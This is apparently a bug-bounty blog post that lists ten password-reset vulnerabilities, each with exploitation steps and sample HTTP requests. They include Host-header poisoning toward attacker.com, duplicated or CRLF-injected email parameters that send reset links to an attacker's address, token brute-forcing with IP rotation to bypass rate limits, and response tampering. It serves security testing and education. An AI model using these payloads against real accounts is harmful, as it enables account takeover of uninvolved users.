---
title: 10 Password Reset Flaws
author: Anugrah SR
date: 2020-09-17 00:00:00 +0800
categories: [Bugbounty, Password reset]
tags: [Bugbounty, Hacking, Password]
math: true
---
##### Common security flaws in password reset functionality compiled from twitter, writeups, disclosed reports.
---
![Password reset image](https://assets.weforum.org/article/image/large_WaY0UhqO6CYY4WYRB_YD8F8_iPJrdgOT_9myYpF60x4.jpg)
## [1] Password Reset Token Leak Via Referrer

The **HTTP referer** is an optional HTTP header field that identifies the address of the webpage which is linked to the resource being requested. The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed
![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)
### Exploitation
* Request password reset to your email address
* Click on the password reset link
* Dont change password
* Click any 3rd party websites(eg: Facebook, twitter)
* Intercept the request in burpsuite proxy
* Check if the referer header is leaking password reset token.

### Impact
It allows the person who has control of particular site to change the user's password (CSRF attack), because this person knows reset password token of the user.
### Reference:
* https://hackerone.com/reports/342693
* https://hackerone.com/reports/272379
* https://hackerone.com/reports/737042
* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
* https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

## [2] Account Takeover Through Password Reset Poisoning

If you find a host header attack and it's out of scope, try to find the password reset button!
![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### Exploitation
* Intercept the password reset request in Burpsuite
* Add follwing header or edit header in burpsuite(try one by one)

*You can use ngrok server as your attacker server*

 ```bash
 Host: attacker.com
 ```
 or
 ```bash
 Host: target.com
 X-Forwarded-Host: attacker.com
 ```
 or
 ```bash
 Host: target.com
 Host: attacker.com
 ```
* Forward the request
```bash
POST https://example.com/reset.php HTTP/1.1
Accept: */*
Content-Type: application/json
Host: evilhost.com
```
* If you find a password reset token like this
```
https://evilhost.com/reset-password.php?token=12345678-1234-1234-1234-12345678901
```
![](https://www.acunetix.com/wp-content/uploads/2018/11/image1-910x443.png)

### Patch

Use `$_SERVER['SERVER_NAME']` rather than `$_SERVER['HTTP_HOST']`

password link is genrated like this:
```bash
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```

### Impact
The victim will receive the malicious link in their email, and, when clicked, will leak the user's password reset link / token to the attacker, leading to full account takeover.

### Reference:
* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## [3] Account Takeover: Password Reset With Manipualating Email Parameter
### Exploitation
1. Add attacker email as second parameter using &
```bash
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
2. Add attacker email as second parameter using %20
```bash
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
3. Add attacker email as second parameter using |
```bash
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
4. Add attacker email as second parameter using cc
```bash
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
5. Add attacker email as second parameter using bcc
```bash
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
6. Add attacker email as second parameter using ,
```bash
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
7. Add attacker email as second parameter in json array
```bash
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```

### Reference
* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

## [4] Full Account Takeover via Changing Email And Password of any User through API Parameters
### Exploitation
* Attacker have to login with their account and Go to the Change password function
* Start the Burp Suite and Intercept the request
* After intercepting the request sent it to repeater and modify parameters Email and Password
```bash
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```

### Reference
* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

## [5] No Rate Limiting: Email Bombing
![](https://www.howtogeek.com/thumbcache/2/200/5b21f5dc5ea2ab9cc8ec78b8cc2e437e/wp-content/uploads/2019/04/email-bomb.jpg)
### Exploitation
* Start the Burp Suite and Intercept the password reset request
* Send to intruder
* Use null payload

### Reference
* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## [6] Findout How Password Reset Token is Genrated

Figure out the pattern of passoword reset token

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg&usqp=CAU)

If it
* Generated based Timestamp
* Generated based on the UserID
* Generated based on email of User
* Generated based on Firstname and Lastname
* Generated based on Date of Birth
* Generated based on Cryptography

Use Burp Sequencer to find the randomness or predictability of tokens.

## [7] Response manipulation: Replace Bad Response With Good One

Look for Request and Response like these
```bash
HTTP/1.1 401 Unauthorized
(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)
```
Change Response
```bash
HTTP/1.1 200 OK
(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)
```
### Reference
* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

## [8] Using Expired Token
![](https://blogs.zoho.com/wp-content/uploads/2015/01/password-reuse.png)

* Check if the expired token can be reused

## [9] Brute Force Password Rest token
Try to bruteforce the reset token using Burpsuite

```bash
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```
* Use IP-Rotator on burpsuite to bypass IP based ratelimit.

### Reference
* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## [10] Try Using Your Token

* Try adding your password reset token with victim's Account

```bash
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```
### Reference
* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## Conclusion
Next time when you see a password reset function, check for all these flaws.<br>
Happy Hunting!
